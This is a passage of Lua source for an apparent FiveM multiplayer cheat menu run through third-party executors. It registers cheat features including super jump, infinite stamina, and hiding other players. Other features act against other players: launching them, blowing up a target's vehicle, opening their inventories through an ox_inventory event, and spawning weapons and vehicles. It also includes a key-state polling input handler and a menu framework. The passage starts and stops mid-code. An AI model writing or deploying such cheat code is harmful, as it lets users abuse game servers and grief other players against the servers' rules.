        if not _G.superJumpEnabled then
            _G.superJumpEnabled = true
            CreateThread(function()
                while _G.superJumpEnabled do
                    SetSuperJumpThisFrame(PlayerId())
                    Wait(0)
                end
            end)
        end
    else
        _G.superJumpEnabled = false
        SetSuperJumpThisFrame(PlayerId(), 1.0)
    end
]], "any")

Utils.RegisterScript("infiniteStamina", [[
    local toggle = %s
    
    if toggle then
        if not _G.infiniteStaminaEnabled then
            _G.infiniteStaminaEnabled = true
            CreateThread(function()
                while _G.infiniteStaminaEnabled do
                    RestorePlayerStamina(PlayerId(), 1.0)
                    Wait(0)
                end
            end)
        end
    else
        _G.infiniteStaminaEnabled = false
    end
]], "any")

Utils.RegisterScript("refillHealth", [[
    local ped = PlayerPedId()
    SetEntityHealth(ped, GetEntityMaxHealth(ped))
]], "any")

Utils.RegisterScript("refillArmor", [[
    local ped = PlayerPedId()
    SetPedArmour(ped, 100)
]], "any")

Utils.RegisterScript("superPunch", [[
    local toggle = %s
    
    _G.superPunchEnabled = toggle
    
    if toggle then
        CreateThread(function()
            while _G.superPunchEnabled do
                local ped = PlayerPedId()
                if IsPedInMeleeCombat(ped) then
                    local targetPed = GetMeleeTargetForPed(ped)
                    if targetPed and targetPed ~= 0 then
                        ApplyForceToEntity(targetPed, 1, 0.0, 0.0, 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                    end
                end
                Wait(0)
            end
        end)
    end
]], "any")

Utils.RegisterScript("pickupThrowVehicles", [[
    local toggle = %s
    
    _G.pickupVehiclesEnabled = toggle
    
    if toggle then
        CreateThread(function()
            while _G.pickupVehiclesEnabled do
                local ped = PlayerPedId()
                if IsControlJustPressed(0, 38) then -- E key
                    local vehicle = GetClosestVehicle(GetEntityCoords(ped), 5.0, 0, 70)
                    if vehicle and vehicle ~= 0 then
                        if not IsEntityAttachedToEntity(vehicle, ped) then
                            AttachEntityToEntity(vehicle, ped, GetPedBoneIndex(ped, 0), 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
                        else
                            DetachEntity(vehicle, true, true)
                            local forward = GetEntityForwardVector(ped)
                            ApplyForceToEntity(vehicle, 1, forward.x * 50.0, forward.y * 50.0, forward.z * 10.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                        end
                    end
                end
                Wait(0)
            end
        end)
    end
]], "any")

Utils.RegisterScript("soloSession", [[
    local toggle = %s
    
    _G.soloSessionEnabled = toggle
    
    if toggle then
        CreateThread(function()
            while _G.soloSessionEnabled do
                local players = GetActivePlayers()
                for _, playerId in ipairs(players) do
                    if playerId ~= PlayerId() then
                        local playerPed = GetPlayerPed(playerId)
                        SetEntityVisible(playerPed, false, false)
                        SetEntityLocallyVisible(playerPed, false)
                    end
                end
                Wait(0)
            end
        end)
    else
        local players = GetActivePlayers()
        for _, playerId in ipairs(players) do
            if playerId ~= PlayerId() then
                local playerPed = GetPlayerPed(playerId)
                SetEntityVisible(playerPed, true, false)
                SetEntityLocallyVisible(playerPed, true)
            end
        end
    end
]], "any")

Utils.RegisterScript("tinyPed", [[
    local toggle = %s
    local ped = PlayerPedId()
    
    if toggle then
        SetPedConfigFlag(ped, 223, true)
    else
        SetPedConfigFlag(ped, 223, false)
    end
]], "any")

Utils.RegisterScript("forceThirdPerson", [[
    local toggle = %s
    
    _G.forceThirdPersonEnabled = toggle
    
    if toggle then
        CreateThread(function()
            while _G.forceThirdPersonEnabled do
                SetFollowPedCamViewMode(0)
                SetFollowVehicleCamViewMode(0)
                Wait(0)
            end
        end)
    end
]], "any")

Utils.RegisterScript("forceDriveby", [[
    local toggle = %s
    
    _G.forceDrivebyEnabled = toggle
    
    if toggle then
        CreateThread(function()
            while _G.forceDrivebyEnabled do
                SetPlayerCanDoDriveBy(PlayerId(), true)
                Wait(0)
            end
        end)
    end
]], "any")

Utils.RegisterScript("clearTasks", [[
    local taskType = %s
    local ped = PlayerPedId()
    
    if taskType == "Primary" then
        ClearPedTasksImmediately(ped)
    elseif taskType == "Secondary" then
        ClearPedSecondaryTask(ped)
    end
]], "any")

Utils.RegisterScript("forceRagdoll", [[
    local ped = PlayerPedId()
    SetPedToRagdoll(ped, 3000, 3000, 0, false, false, false)
]], "any")

Utils.RegisterScript("openNearbyInventory", [[
    local toggle = %s
    
    _G.openNearbyInventoriesEnabled = toggle
    
    if toggle then
        CreateThread(function()
            while _G.openNearbyInventoriesEnabled do
                if IsControlJustPressed(0, 167) then -- F6
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)
                    local closestPlayer = -1
                    local closestDistance = -1
                    
                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)
                            
                            if closestDistance == -1 or distance < closestDistance then
                                closestPlayer = playerId
                                closestDistance = distance
                            end
                        end
                    end
                    
                    if closestPlayer ~= -1 and closestDistance <= 2.0 then
                        TriggerEvent('ox_inventory:openInventory', 'otherplayer', GetPlayerServerId(closestPlayer))
                    end
                end
                Wait(0)
            end
        end)
    end
]], {"ox_inventory"})

-- Wardrobe Features
Utils.RegisterScript("setPedModel", [[
    local pedModel = %s
    local modelHash = GetHashKey(pedModel)
    RequestModel(modelHash)
    while not HasModelLoaded(modelHash) do Wait(0) end
    
    SetPlayerModel(PlayerId(), modelHash)
    SetModelAsNoLongerNeeded(modelHash)
    
    local playerPed = PlayerPedId()
    SetPedDefaultComponentVariation(playerPed)
    SetPedRandomComponentVariation(playerPed, true)
    SetPedRandomProps(playerPed)
    SetEntityInvincible(playerPed, false)
    ClearPedTasksImmediately(playerPed)
]], "any")

Utils.RegisterScript("setPedHat", [[
    local value = %s
    SetPedPropIndex(PlayerPedId(), 0, value - 1, 0, true)
]], "any")

Utils.RegisterScript("setPedMask", [[
    local value = %s
    SetPedComponentVariation(PlayerPedId(), 1, value - 1, 0, 0)
]], "any")

Utils.RegisterScript("setPedGlasses", [[
    local value = %s
    SetPedPropIndex(PlayerPedId(), 1, value - 1, 0, true)
]], "any")

Utils.RegisterScript("setPedTorso", [[
    local value = %s
    SetPedComponentVariation(PlayerPedId(), 3, value - 1, 0, 0)
]], "any")

Utils.RegisterScript("setPedTshirt", [[
    local value = %s
    SetPedComponentVariation(PlayerPedId(), 8, value - 1, 0, 0)
]], "any")

Utils.RegisterScript("setPedPants", [[
    local value = %s
    SetPedComponentVariation(PlayerPedId(), 4, value - 1, 0, 0)
]], "any")

Utils.RegisterScript("setPedShoes", [[
    local value = %s
    SetPedComponentVariation(PlayerPedId(), 6, value - 1, 0, 0)
]], "any")

-- Player Interaction Additional Features
Utils.RegisterScript("launchPlayer", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    if IsPedInAnyVehicle(targetPed, false) then
        return
    end
    
    local coords = GetEntityCoords(targetPed)
    local myPed = PlayerPedId()
    
    for i = 1, 15 do
        SetEntityCoords(myPed, coords.x, coords.y, coords.z + 0.5, false, false, false, false)
        Wait(50)
        AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
        Wait(50)
        DetachEntity(myPed, true, true)
        Wait(100)
    end
]], "any")

Utils.RegisterScript("stealOutfit", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    local playerPed = PlayerPedId()
    
    for compId = 0, 11 do
        local drawable = GetPedDrawableVariation(targetPed, compId)
        local texture = GetPedTextureVariation(targetPed, compId)
        local palette = GetPedPaletteVariation(targetPed, compId)
        SetPedComponentVariation(playerPed, compId, drawable, texture, palette)
    end
    
    for propId = 0, 7 do
        local propIndex = GetPedPropIndex(targetPed, propId)
        if propIndex ~= -1 then
            local texture = GetPedPropTextureIndex(targetPed, propId)
            SetPedPropIndex(playerPed, propId, propIndex, texture, true)
        else
            ClearPedProp(playerPed, propId)
        end
    end
]], "any")

Utils.RegisterScript("fuckVehicle", [[
    local targetServerId = %s
    local targetPlayer = GetPlayerFromServerId(targetServerId)
    if targetPlayer == -1 then return end
    
    local targetPed = GetPlayerPed(targetPlayer)
    if not DoesEntityExist(targetPed) then return end
    
    if IsPedInAnyVehicle(targetPed, false) then
        local vehicle = GetVehiclePedIsIn(targetPed, false)
        if DoesEntityExist(vehicle) then
            local coords = GetEntityCoords(vehicle)
            AddExplosion(coords.x, coords.y, coords.z, 1, 1.0, true, false, 0.5)
        end
    end
]], "any")

-- Vehicle Additional Features
Utils.RegisterScript("spawnCustomVehicle", [[
    local vehicleModel = %s
    local ped = PlayerPedId()
    local pedCoords = GetEntityCoords(ped)
    local pedHeading = GetEntityHeading(ped)
    
    local modelHash = GetHashKey(vehicleModel)
    RequestModel(modelHash)
    while not HasModelLoaded(modelHash) do Wait(0) end
    
    local vehicle = CreateVehicle(modelHash, pedCoords.x, pedCoords.y, pedCoords.z, pedHeading, true, true)
    if DoesEntityExist(vehicle) then
        SetVehicleOnGroundProperly(vehicle)
        SetVehicleNeedsToBeHotwired(vehicle, false)
        SetVehicleEngineOn(vehicle, true, true, false)
        SetVehicleDoorsLocked(vehicle, 1)
        SetVehicleHasBeenOwnedByPlayer(vehicle, true)
        TaskWarpPedIntoVehicle(ped, vehicle, -1)
    end
    
    SetModelAsNoLongerNeeded(modelHash)
]], "any")

-- Weapon Additional Features
Utils.RegisterScript("removeAllWeapons", [[
    RemoveAllPedWeapons(PlayerPedId(), true)
]], "any")

Utils.RegisterScript("giveCustomWeapon", [[
    local weaponName = %s
    local playerPed = PlayerPedId()
    local weaponHash = GetHashKey(weaponName)
    GiveWeaponToPed(playerPed, weaponHash, 250, false, true)
]], {"ox_inventory", "any"})
]====])() --features

local MENU = load([====[
local vKeys = {
    VK_LBUTTON = 0x01,
    VK_RBUTTON = 0x02,
    VK_CANCEL = 0x03,
    VK_MBUTTON = 0x04,
    VK_XBUTTON1 = 0x05,
    VK_XBUTTON2 = 0x06,
    VK_BACK = 0x08,
    VK_TAB = 0x09,
    VK_CLEAR = 0x0C,
    VK_RETURN = 0x0D,
    VK_SHIFT = 0x10,
    VK_CONTROL = 0x11,
    VK_MENU = 0x12,
    VK_PAUSE = 0x13,
    VK_CAPITAL = 0x14,
    VK_KANA = 0x15,
    VK_HANGUL = 0x15,
    VK_IME_ON = 0x16,
    VK_JUNJA = 0x17,
    VK_FINAL = 0x18,
    VK_HANJA = 0x19,
    VK_KANJI = 0x19,
    VK_IME_OFF = 0x1A,
    VK_ESCAPE = 0x1B,
    VK_CONVERT = 0x1C,
    VK_NONCONVERT = 0x1D,
    VK_ACCEPT = 0x1E,
    VK_MODECHANGE = 0x1F,
    VK_SPACE = 0x20,
    VK_PRIOR = 0x21,
    VK_NEXT = 0x22,
    VK_END = 0x23,
    VK_HOME = 0x24,
    VK_LEFT = 0x25,
    VK_UP = 0x26,
    VK_RIGHT = 0x27,
    VK_DOWN = 0x28,
    VK_SELECT = 0x29,
    VK_PRINT = 0x2A,
    VK_EXECUTE = 0x2B,
    VK_SNAPSHOT = 0x2C,
    VK_INSERT = 0x2D,
    VK_DELETE = 0x2E,
    VK_HELP = 0x2F,
    VK_0 = 0x30,
    VK_1 = 0x31,
    VK_2 = 0x32,
    VK_3 = 0x33,
    VK_4 = 0x34,
    VK_5 = 0x35,
    VK_6 = 0x36,
    VK_7 = 0x37,
    VK_8 = 0x38,
    VK_9 = 0x39,
    VK_A = 0x41,
    VK_B = 0x42,
    VK_C = 0x43,
    VK_D = 0x44,
    VK_E = 0x45,
    VK_F = 0x46,
    VK_G = 0x47,
    VK_H = 0x48,
    VK_I = 0x49,
    VK_J = 0x4A,
    VK_K = 0x4B,
    VK_L = 0x4C,
    VK_M = 0x4D,
    VK_N = 0x4E,
    VK_O = 0x4F,
    VK_P = 0x50,
    VK_Q = 0x51,
    VK_R = 0x52,
    VK_S = 0x53,
    VK_T = 0x54,
    VK_U = 0x55,
    VK_V = 0x56,
    VK_W = 0x57,
    VK_X = 0x58,
    VK_Y = 0x59,
    VK_Z = 0x5A,
    VK_LWIN = 0x5B,
    VK_RWIN = 0x5C,
    VK_APPS = 0x5D,
    VK_SLEEP = 0x5F,
    VK_NUMPAD0 = 0x60,
    VK_NUMPAD1 = 0x61,
    VK_NUMPAD2 = 0x62,
    VK_NUMPAD3 = 0x63,
    VK_NUMPAD4 = 0x64,
    VK_NUMPAD5 = 0x65,
    VK_NUMPAD6 = 0x66,
    VK_NUMPAD7 = 0x67,
    VK_NUMPAD8 = 0x68,
    VK_NUMPAD9 = 0x69,
    VK_MULTIPLY = 0x6A,
    VK_ADD = 0x6B,
    VK_SEPARATOR = 0x6C,
    VK_SUBTRACT = 0x6D,
    VK_DECIMAL = 0x6E,
    VK_DIVIDE = 0x6F,
    VK_F1 = 0x70,
    VK_F2 = 0x71,
    VK_F3 = 0x72,
    VK_F4 = 0x73,
    VK_F5 = 0x74,
    VK_F6 = 0x75,
    VK_F7 = 0x76,
    VK_F8 = 0x77,
    VK_F9 = 0x78,
    VK_F10 = 0x79,
    VK_F11 = 0x7A,
    VK_F12 = 0x7B,
    VK_F13 = 0x7C,
    VK_F14 = 0x7D,
    VK_F15 = 0x7E,
    VK_F16 = 0x7F,
    VK_F17 = 0x80,
    VK_F18 = 0x81,
    VK_F19 = 0x82,
    VK_F20 = 0x83,
    VK_F21 = 0x84,
    VK_F22 = 0x85,
    VK_F23 = 0x86,
    VK_F24 = 0x87,
    VK_NUMLOCK = 0x90,
    VK_SCROLL = 0x91,
    VK_LSHIFT = 0xA0,
    VK_RSHIFT = 0xA1,
    VK_LCONTROL = 0xA2,
    VK_RCONTROL = 0xA3,
    VK_LMENU = 0xA4,
    VK_RMENU = 0xA5,
    VK_BROWSER_BACK = 0xA6,
    VK_BROWSER_FORWARD = 0xA7,
    VK_BROWSER_REFRESH = 0xA8,
    VK_BROWSER_STOP = 0xA9,
    VK_BROWSER_SEARCH = 0xAA,
    VK_BROWSER_FAVORITES = 0xAB,
    VK_BROWSER_HOME = 0xAC,
    VK_VOLUME_MUTE = 0xAD,
    VK_VOLUME_DOWN = 0xAE,
    VK_VOLUME_UP = 0xAF,
    VK_MEDIA_NEXT_TRACK = 0xB0,
    VK_MEDIA_PREV_TRACK = 0xB1,
    VK_MEDIA_STOP = 0xB2,
    VK_MEDIA_PLAY_PAUSE = 0xB3,
    VK_LAUNCH_MAIL = 0xB4,
    VK_LAUNCH_MEDIA_SELECT = 0xB5,
    VK_LAUNCH_APP1 = 0xB6,
    VK_LAUNCH_APP2 = 0xB7,
    VK_OEM_1 = 0xBA,
    VK_OEM_PLUS = 0xBB,
    VK_OEM_COMMA = 0xBC,
    VK_OEM_MINUS = 0xBD,
    VK_OEM_PERIOD = 0xBE,
    VK_OEM_2 = 0xBF,
    VK_OEM_3 = 0xC0,
    VK_GAMEPAD_A = 0xC3,
    VK_GAMEPAD_B = 0xC4,
    VK_GAMEPAD_X = 0xC5,
    VK_GAMEPAD_Y = 0xC6,
    VK_GAMEPAD_RIGHT_SHOULDER = 0xC7,
    VK_GAMEPAD_LEFT_SHOULDER = 0xC8,
    VK_GAMEPAD_LEFT_TRIGGER = 0xC9,
    VK_GAMEPAD_RIGHT_TRIGGER = 0xCA,
    VK_GAMEPAD_DPAD_UP = 0xCB,
    VK_GAMEPAD_DPAD_DOWN = 0xCC,
    VK_GAMEPAD_DPAD_LEFT = 0xCD,
    VK_GAMEPAD_DPAD_RIGHT = 0xCE,
    VK_GAMEPAD_MENU = 0xCF,
    VK_GAMEPAD_VIEW = 0xD0,
    VK_GAMEPAD_LEFT_THUMBSTICK_BUTTON = 0xD1,
    VK_GAMEPAD_RIGHT_THUMBSTICK_BUTTON = 0xD2,
    VK_GAMEPAD_LEFT_THUMBSTICK_UP = 0xD3,
    VK_GAMEPAD_LEFT_THUMBSTICK_DOWN = 0xD4,
    VK_GAMEPAD_LEFT_THUMBSTICK_RIGHT = 0xD5,
    VK_GAMEPAD_LEFT_THUMBSTICK_LEFT = 0xD6,
    VK_GAMEPAD_RIGHT_THUMBSTICK_UP = 0xD7,
    VK_GAMEPAD_RIGHT_THUMBSTICK_DOWN = 0xD8,
    VK_GAMEPAD_RIGHT_THUMBSTICK_RIGHT = 0xD9,
    VK_GAMEPAD_RIGHT_THUMBSTICK_LEFT = 0xDA,
    VK_OEM_4 = 0xDB,
    VK_OEM_5 = 0xDC,
    VK_OEM_6 = 0xDD,
    VK_OEM_7 = 0xDE,
    VK_OEM_8 = 0xDF,
    VK_OEM_102 = 0xE2,
    VK_PROCESSKEY = 0xE5,
    VK_PACKET = 0xE7,
    VK_ATTN = 0xF6,
    VK_CRSEL = 0xF7,
    VK_EXSEL = 0xF8,
    VK_EREOF = 0xF9,
    VK_PLAY = 0xFA,
    VK_ZOOM = 0xFB,
    VK_NONAME = 0xFC,
    VK_PA1 = 0xFD,
    VK_OEM_CLEAR = 0xFE
}


local LAYOUTS          = {}

LAYOUTS.vKeys          = vKeys

LAYOUTS.layouts        = {}
LAYOUTS.selectedLayout = ""
LAYOUTS.shiftDown      = false
LAYOUTS.altDown        = false
LAYOUTS.controlDown    = false

LAYOUTS.callbacks      = {}

function LAYOUTS:registerLayout(name)
    self.layouts[name] = self.layouts[name] or {}


    local fixedKeys = {
        vKeys.VK_SHIFT, vKeys.VK_CONTROL, vKeys.VK_MENU, vKeys.VK_RETURN, vKeys.VK_TAB, vKeys.VK_ESCAPE, vKeys.VK_BACK,
        vKeys.VK_UP, vKeys.VK_DOWN, vKeys.VK_LEFT, vKeys.VK_RIGHT,
        vKeys.VK_DELETE, vKeys.VK_HOME, vKeys.VK_END, vKeys.VK_PRIOR,
        vKeys.VK_NEXT, vKeys.VK_CAPITAL
    }

    local fixedNames = {
        "SHIFT", "CONTROL", "ALT", "ENTER", "TAB", "ESCAPE", "BACKSPACE",
        "UP", "DOWN", "LEFT", "RIGHT",
        "DELETE", "HOME", "END", "PAGEUP",
        "PAGEDOWN", "CAPS"
    }
    for i, vKey in ipairs(fixedKeys) do
        LAYOUTS:registerKey(name, vKey, fixedNames[i], fixedNames[i], fixedNames[i])
    end

    local tbl = {}
    tbl.layout = name
    function tbl:registerKey(vKey, normal, shift, altgr)
        LAYOUTS:registerKey(self.layout, vKey, normal, shift, altgr)
    end

    return tbl
end

function LAYOUTS:registerKey(name, vKey, normal, shift, altgr)
    self.layouts[name] = self.layouts[name] or {}
    self.layouts[name][vKey] = {
        ["normal"] = normal,
        ["shift"]  = shift,
        ["altgr"]  = altgr,
    }
end

function LAYOUTS:selectLayout(name)
    if not self.layouts[name] then return end
    self.selectedLayout = name
end

function LAYOUTS:convertToKey(vKey)
    if not self.layouts[self.selectedLayout] then return end
    -- TOOD:
    local layout = self.layouts[self.selectedLayout];

    local key = layout[vKey]
    if not key then return "" end
    if self.shiftDown then
        return key["shift"]
    elseif self.altDown and self.controlDown then
        return key["altgr"]
    else
        return key["normal"]
    end
end
-- 
function LAYOUTS:handleKey(vKey, down)
    if vKey == vKeys["VK_SHIFT"] then
        self.shiftDown = down;
    elseif vKey == vKeys.VK_CAPITAL then
        self.shiftDown = down;
    elseif vKey == vKeys["VK_CONTROL"] then
        self.controlDown = down
    elseif vKey == vKeys["VK_MENU"] then
        self.altDown = down
    end

    if not down then return end

    local char = self:convertToKey(vKey);
    if not char then return end

    for i = 1, #self.callbacks do
        local func = self.callbacks[i];
        func(char)
    end
end

function LAYOUTS:AddCallback(func)
    self.callbacks[#self.callbacks + 1] = func
end

--MachoOnKeyDown(function(keycode)
--    LAYOUTS:handleKey(keycode, true)
--end)
--MachoOnKeyUp(function(keycode)
--    LAYOUTS:handleKey(keycode, false)
--end)

-------- QWERTZ ----------------
local layout = LAYOUTS:registerLayout("QWERTZ")

layout:registerKey(vKeys.VK_1, "1", "!", "")
layout:registerKey(vKeys.VK_2, "2", "\"", "²")
layout:registerKey(vKeys.VK_3, "3", "§", "³")
layout:registerKey(vKeys.VK_4, "4", "$", "")
layout:registerKey(vKeys.VK_5, "5", '%', "")
layout:registerKey(vKeys.VK_6, "6", "&", "")
layout:registerKey(vKeys.VK_7, "7", "/", "{")
layout:registerKey(vKeys.VK_8, "8", "(", "[")
layout:registerKey(vKeys.VK_9, "9", ")", "]")
layout:registerKey(vKeys.VK_0, "0", "=", "}")
layout:registerKey(vKeys.VK_OEM_4, "ß", "?", "\\")
layout:registerKey(vKeys.VK_OEM_6, "´", "`", "")
layout:registerKey(vKeys.VK_Q, "q", "Q", "@")
layout:registerKey(vKeys.VK_W, "w", "W", "")
layout:registerKey(vKeys.VK_E, "e", "E", "€")
layout:registerKey(vKeys.VK_R, "r", "R", "")
layout:registerKey(vKeys.VK_T, "t", "T", "")
layout:registerKey(vKeys.VK_Z, "z", "Z", "")
layout:registerKey(vKeys.VK_U, "u", "U", "")
layout:registerKey(vKeys.VK_I, "i", "I", "")
layout:registerKey(vKeys.VK_O, "o", "O", "")
layout:registerKey(vKeys.VK_P, "p", "P", "")
layout:registerKey(vKeys.VK_OEM_1, "ü", "Ü", "")
layout:registerKey(vKeys.VK_OEM_PLUS, "+", "*", "~")
layout:registerKey(vKeys.VK_A, "a", "A", "")
layout:registerKey(vKeys.VK_S, "s", "S", "")
layout:registerKey(vKeys.VK_D, "d", "D", "")
layout:registerKey(vKeys.VK_F, "f", "F", "")
layout:registerKey(vKeys.VK_G, "g", "G", "")
layout:registerKey(vKeys.VK_H, "h", "H", "")
layout:registerKey(vKeys.VK_J, "j", "J", "")
layout:registerKey(vKeys.VK_K, "k", "K", "")
layout:registerKey(vKeys.VK_L, "l", "L", "")
layout:registerKey(vKeys.VK_OEM_3, "ö", "Ö", "")
layout:registerKey(vKeys.VK_OEM_7, "ä", "Ä", "")
layout:registerKey(vKeys.VK_OEM_2, "#", "'", "")
-- Bottom row
layout:registerKey(vKeys.VK_Y, "y", "Y", "")
layout:registerKey(vKeys.VK_X, "x", "X", "")
layout:registerKey(vKeys.VK_C, "c", "C", "")
layout:registerKey(vKeys.VK_V, "v", "V", "")
layout:registerKey(vKeys.VK_B, "b", "B", "")
layout:registerKey(vKeys.VK_N, "n", "N", "")
layout:registerKey(vKeys.VK_M, "m", "M", "")
layout:registerKey(vKeys.VK_OEM_COMMA, ",", ";", "")
layout:registerKey(vKeys.VK_OEM_PERIOD, ".", ":", "")
layout:registerKey(vKeys.VK_OEM_MINUS, "-", "_", "")
layout:registerKey(vKeys.VK_OEM_102, "<", ">", "|")
layout:registerKey(vKeys.VK_SPACE, " ", " ", " ")



-- Additional keys (if needed)
-- You can add more keys for QWERTZ-specific layouts as required.

-------- QWERTY ----------------
local qwerty = LAYOUTS:registerLayout("QWERTY")

qwerty:registerKey(vKeys.VK_1, "1", "!", "")
qwerty:registerKey(vKeys.VK_2, "2", "@", "")
qwerty:registerKey(vKeys.VK_3, "3", "#", "")
qwerty:registerKey(vKeys.VK_4, "4", "$", "")
qwerty:registerKey(vKeys.VK_5, "5", "%", "")
qwerty:registerKey(vKeys.VK_6, "6", "^", "")
qwerty:registerKey(vKeys.VK_7, "7", "&", "")
qwerty:registerKey(vKeys.VK_8, "8", "*", "")
qwerty:registerKey(vKeys.VK_9, "9", "(", "")
qwerty:registerKey(vKeys.VK_0, "0", ")", "")
qwerty:registerKey(vKeys.VK_OEM_MINUS, "-", "_", "")
qwerty:registerKey(vKeys.VK_OEM_PLUS, "=", "+", "")

qwerty:registerKey(vKeys.VK_Q, "q", "Q", "")
qwerty:registerKey(vKeys.VK_W, "w", "W", "")
qwerty:registerKey(vKeys.VK_E, "e", "E", "")
qwerty:registerKey(vKeys.VK_R, "r", "R", "")
qwerty:registerKey(vKeys.VK_T, "t", "T", "")
qwerty:registerKey(vKeys.VK_Y, "y", "Y", "")
qwerty:registerKey(vKeys.VK_U, "u", "U", "")
qwerty:registerKey(vKeys.VK_I, "i", "I", "")
qwerty:registerKey(vKeys.VK_O, "o", "O", "")
qwerty:registerKey(vKeys.VK_P, "p", "P", "")
qwerty:registerKey(vKeys.VK_OEM_4, "[", "{", "")
qwerty:registerKey(vKeys.VK_OEM_6, "]", "}", "")
qwerty:registerKey(vKeys.VK_OEM_5, "\\", "|", "")

-- Home row
qwerty:registerKey(vKeys.VK_A, "a", "A", "")
qwerty:registerKey(vKeys.VK_S, "s", "S", "")
qwerty:registerKey(vKeys.VK_D, "d", "D", "")
qwerty:registerKey(vKeys.VK_F, "f", "F", "")
qwerty:registerKey(vKeys.VK_G, "g", "G", "")
qwerty:registerKey(vKeys.VK_H, "h", "H", "")
qwerty:registerKey(vKeys.VK_J, "j", "J", "")
qwerty:registerKey(vKeys.VK_K, "k", "K", "")
qwerty:registerKey(vKeys.VK_L, "l", "L", "")
qwerty:registerKey(vKeys.VK_OEM_1, ";", ":", "")
qwerty:registerKey(vKeys.VK_OEM_7, "'", "\"", "")

-- Bottom row
qwerty:registerKey(vKeys.VK_Z, "z", "Z", "")
qwerty:registerKey(vKeys.VK_X, "x", "X", "")
qwerty:registerKey(vKeys.VK_C, "c", "C", "")
qwerty:registerKey(vKeys.VK_V, "v", "V", "")
qwerty:registerKey(vKeys.VK_B, "b", "B", "")
qwerty:registerKey(vKeys.VK_N, "n", "N", "")
qwerty:registerKey(vKeys.VK_M, "m", "M", "")
qwerty:registerKey(vKeys.VK_OEM_COMMA, ",", "<", "")
qwerty:registerKey(vKeys.VK_OEM_PERIOD, ".", ">", "")
qwerty:registerKey(vKeys.VK_OEM_2, "/", "?", "")

-- Spacebar
qwerty:registerKey(vKeys.VK_SPACE, " ", " ", " ")

LAYOUTS:selectLayout("QWERTZ")

LAYOUT = LAYOUTS

if Susano and Susano.GetAsyncKeyState then
    local OnKeyUpCallbacks   = {}
    local OnKeyDownCallbacks = {}

    Citizen.CreateThread(function()
        local lastState = {}
        while true do
            Citizen.Wait(10)
            for idx, v in pairs(LAYOUT.vKeys) do
                local down, pressed = Susano.GetAsyncKeyState(v)
                if down and not lastState[v] then
                    for _, cb in ipairs(OnKeyDownCallbacks) do
                        cb(v)
                    end
                elseif not down and lastState[v] then
                    for _, cb in ipairs(OnKeyUpCallbacks) do
                        cb(v)
                    end
                end
                lastState[v] = down
            end
        end
    end)

    Susano.OnKeyDownCustom = function(callback)
        table.insert(OnKeyDownCallbacks, callback)
    end

    Susano.OnKeyUpCustom = function(callback)
        table.insert(OnKeyUpCallbacks, callback)
    end
end

local ONKEYUP = MachoOnKeyUp or Susano and Susano.OnKeyUpCustom
local ONKEYDOWN = MachoOnKeyDown or Susano and Susano.OnKeyDownCustom

ONKEYDOWN(function(keycode)
    LAYOUT:handleKey(keycode, true)
end)

ONKEYUP(function(keycode)
    LAYOUT:handleKey(keycode, false)
end)

MatrixLua = {
    hotkey = "CAPS",
    visible = true,
    shiftDown = false,
    tabSwitchKeys = "QE", -- Default to Q/E, can be changed to "AE" for A/E
    inputbox = {
        enabled = false,
        text = "",
        title = "",
    },
    menu = {
        name = "Home",
        type = "menu",
        entries = {},
    },
    playersMenu = nil,
    selectedIndex = { { entryIndex = 1, subIndex = 1 } },
    debug_info = true
}

-- Category metatable
local Category = {}
Category.__index = Category

function Category:AddButton(label, callback)
    local btn = { name = label, type = "button", callback = callback }
    table.insert(self.entries, btn)
    return btn
end

function Category:AddToggle(label, callback, default, data)
    local tgl = { name = label, type = "toggle", value = default or false, callback = callback, data = data or {} }
    table.insert(self.entries, tgl)
    return tgl
end

function Category:AddSlider(label, default, min, max, step, callback)
    local sld = {
        name = label,
        type = "slider",
        value = default or min,
        settings = { min = min, max = max, step = step or 1 },
        callback = callback
    }
    table.insert(self.entries, sld)
    return sld
end

function Category:AddOptions(label, options, callback, defaultIndex)
    local opt = {
        name = label,
        type = "options",
        options = options,
        index = defaultIndex or 1,
        callback = callback
    }
    table.insert(self.entries, opt)
    return opt
end

function Category:AddDivider(label)
    local div = { name = label or "", type = "divider" }
    table.insert(self.entries, div)
    return div
end

function Category:AddCategory(label)
    local cat = setmetatable({ name = label, type = "menu", entries = {} }, Category)
    table.insert(self.entries, cat)
    return cat
end

function Category:RemoveByName(label)
    for i, entry in ipairs(self.entries) do
        if entry.name == label then
            table.remove(self.entries, i)
            return true
        end
    end
    return false
end

function Category:RemoveToggleById(id)
    for i, entry in ipairs(self.entries) do
        if entry.type == "toggle" and entry.id == id then
            table.remove(self.entries, i)
            return true
        end
    end
    return false
end

function Category:AddPlayerToggles()
    self.toggledIds = self.toggledIds or {}
    local localPlayerId = PlayerId()
    for _, playerId in ipairs(GetActivePlayers()) do
        local serverid = GetPlayerServerId(playerId)
        local name = GetPlayerName(playerId)
        local default = self.toggledIds[serverid] == true
        if playerId == localPlayerId then
            name = "[SELF] " .. name
        end
        self:AddToggle(("%s  |  %s"):format(name, serverid), function(val)
            self.toggledIds[serverid] = val
        end, default, { id = serverid })
    end
end

function Category:ClearPlayerToggles()
    local i = 1
    while i <= #self.entries do
        local entry = self.entries[i]
        if entry.type == "toggle" and entry.data and entry.data.id then
            table.remove(self.entries, i)
        else
            i = i + 1
        end
    end
    self.toggledIds = {}
end

function Category:RefreshPlayerToggles()
    self.toggledIds = self.toggledIds or {}
    local activeIds = {}
    for _, playerId in ipairs(GetActivePlayers()) do
        local serverid = GetPlayerServerId(playerId)
        activeIds[serverid] = true
    end

    for i = #self.entries, 1, -1 do
        local entry = self.entries[i]
